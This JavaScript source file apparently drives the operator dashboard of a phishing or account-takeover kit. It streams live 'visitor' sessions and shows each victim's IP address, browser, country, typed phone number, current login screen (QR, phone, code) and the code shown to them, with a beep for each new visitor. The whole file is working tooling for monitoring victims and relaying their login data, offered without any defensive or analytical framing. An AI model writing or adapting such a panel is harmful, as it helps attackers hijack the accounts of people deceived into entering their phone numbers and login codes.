/* sup operator panel — ws client + DOM render */
(() => {
  'use strict';

  const $ = (s, r = document) => r.querySelector(s);
  const $$ = (s, r = document) => Array.from(r.querySelectorAll(s));

  const grid       = $('#grid');
  const empty      = $('#empty');
  const tpl        = $('#cardTpl');
  const wsDot      = $('#wsDot');
  const liveCount  = $('#liveCount');
  const totalCount = $('#totalCount');
  const toasts     = $('#toasts');
  const soundEl    = $('#soundToggle');

  const cards = new Map(); // sid -> {el, info, lastBeat}
  let totalSeen = 0;
  let beepCtx = null;

  const params = new URLSearchParams(location.search);
  const token = params.get('k') || '';

  function wsUrl() {
    const proto = location.protocol === 'https:' ? 'wss' : 'ws';
    return `${proto}://${location.host}/ws/op?k=${encodeURIComponent(token)}`;
  }

  function setLive(ok) {
    wsDot.classList.toggle('ok', !!ok);
  }

  function fmtTime(ts) {
    if (!ts) return '';
    const d = new Date(ts * 1000);
    return d.toTimeString().slice(0, 8);
  }

  function shortUa(ua) {
    if (!ua) return '—';
    const m = ua.match(/(Chrome|Firefox|Safari|Edge|OPR)\/[\d.]+/);
    const os = ua.match(/\(([^)]+)\)/);
    return [m ? m[0] : 'unknown', os ? os[1].split(';')[0] : ''].filter(Boolean).join(' · ');
  }

  function ensureCard(info) {
    let entry = cards.get(info.sid);
    if (entry) return entry;
    const node = tpl.content.firstElementChild.cloneNode(true);
    node.dataset.sid = info.sid;
    $('.card__sid', node).textContent = '#' + info.sid;
    grid.appendChild(node);
    entry = { el: node, info: { ...info } };
    cards.set(info.sid, entry);
    totalSeen++;
    refreshCounters();
    empty.style.display = 'none';
    return entry;
  }

  function refreshCounters() {
    liveCount.textContent = String(cards.size);
    totalCount.textContent = String(totalSeen);
    if (cards.size === 0) empty.style.display = '';
  }

  function renderCard(entry, kind) {
    const { el, info } = entry;
    $('.ip', el).textContent = info.ip || '—';
    $('.ua', el).textContent = shortUa(info.ua);
    const c = info.country;
    $('.country', el).textContent = c ? `${c.flag || ''} ${c.name || ''} +${c.code || ''}`.trim() : '—';
    $('.phone', el).textContent = info.phone || '—';
    $('.code', el).textContent  = info.code || '—';

    const badge = $('.card__screen', el);
    badge.textContent = info.screen || 'qr';
    badge.classList.remove('is-qr', 'is-phone', 'is-code');
    badge.classList.add('is-' + (info.screen || 'qr'));

    $('.card__time', el).textContent = fmtTime(info.last);

    if (kind) {
      logLine(entry, kind, info);
      el.classList.remove('is-flash');
      void el.offsetWidth;
      el.classList.add('is-flash');
    }
  }

  function logLine(entry, kind, info) {
    const log = $('.card__log', entry.el);
    const line = document.createElement('div');
    line.className = 'line';
    let val = '';
    if (kind === 'phone_input' || kind === 'phone_submit') val = info.phone || '';
    else if (kind === 'country') val = info.country ? `+${info.country.code} ${info.country.name}` : '';
    else if (kind === 'screen') val = info.screen || '';
    else if (kind === 'code_shown') val = info.code || '';
    line.innerHTML = `<span class="ts">${fmtTime(info.last)}</span><span class="t">${kind}</span><span class="vv"></span>`;
    line.querySelector('.vv').textContent = val;
    log.prepend(line);
    while (log.children.length > 50) log.lastElementChild.remove();
  }

  function dropCard(sid) {
    const entry = cards.get(sid);
    if (!entry) return;
    entry.el.classList.add('is-stale');
    setTimeout(() => {
      entry.el.remove();
      cards.delete(sid);
      refreshCounters();
    }, 1500);
  }

  function toast(text) {
    const t = document.createElement('div');
    t.className = 'toast';
    t.innerHTML = text;
    toasts.appendChild(t);
    setTimeout(() => { t.style.opacity = '0'; t.style.transition = 'opacity .3s'; }, 3500);
    setTimeout(() => t.remove(), 4000);
    if (soundEl.checked) beep();
  }

  function beep() {
    try {
      beepCtx = beepCtx || new (window.AudioContext || window.webkitAudioContext)();
      const o = beepCtx.createOscillator();
      const g = beepCtx.createGain();
      o.connect(g); g.connect(beepCtx.destination);
      o.type = 'sine';
      o.frequency.value = 880;
      g.gain.setValueAtTime(0.0001, beepCtx.currentTime);
      g.gain.exponentialRampToValueAtTime(0.15, beepCtx.currentTime + 0.01);
      g.gain.exponentialRampToValueAtTime(0.0001, beepCtx.currentTime + 0.18);
      o.start();
      o.stop(beepCtx.currentTime + 0.2);
    } catch {}
  }

  // ---- WS connection with auto-reconnect ----
  let ws = null;
  let backoff = 500;

  function connect() {
    setLive(false);
    try {
      ws = new WebSocket(wsUrl());
    } catch (e) {
      scheduleReconnect();
      return;
    }
    ws.onopen = () => {
      setLive(true);
      backoff = 500;
    };
    ws.onmessage = (ev) => {
      let m;
      try { m = JSON.parse(ev.data); } catch { return; }
      handle(m);
    };
    ws.onclose = () => {
      setLive(false);
      scheduleReconnect();
    };
    ws.onerror = () => {
      try { ws.close(); } catch {}
    };
  }

  function scheduleReconnect() {
    backoff = Math.min(backoff * 2, 8000);
    setTimeout(connect, backoff);
  }

  function handle(m) {
    if (m.type === 'snapshot') {
      m.sessions.forEach(info => {
        const e = ensureCard(info);
        e.info = info;
        renderCard(e);
      });
      return;
    }
    if (m.type === 'join') {
      const e = ensureCard(m.session);
      e.info = m.session;
      renderCard(e);
      toast(`new visitor <b>#${m.session.sid}</b> · ${m.session.ip || '?'}`);
      return;
    }
    if (m.type === 'event') {
      const e = ensureCard(m.session);
      e.info = m.session;
      renderCard(e, m.kind);
      return;
    }
    if (m.type === 'leave') {
      dropCard(m.sid);
      return;
    }
  }

  connect();
})();
